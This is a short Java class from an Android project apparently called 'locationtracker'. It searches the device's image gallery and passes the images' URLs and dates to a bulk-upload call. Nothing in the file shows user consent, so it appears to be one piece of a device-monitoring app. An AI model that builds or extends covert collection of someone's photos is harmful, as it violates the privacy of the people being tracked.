package gallery;

import android.content.Context;
import android.os.Build;

import androidx.annotation.RequiresApi;

import com.varbin.locationtracker.APIs.CreaterClass;

import java.util.List;

public class galleryRunner {
    @RequiresApi(api = Build.VERSION_CODES.O)
    public static void GetImages(Context context){
        galleryMultiClass gallery = galleryGetter.SearchImages(context);
        if (gallery!=null){
            CreaterClass.sendBulkImages(gallery.url , gallery.date , context);
        }
        CreaterClass.inActive("gallery" , context);
    }
}
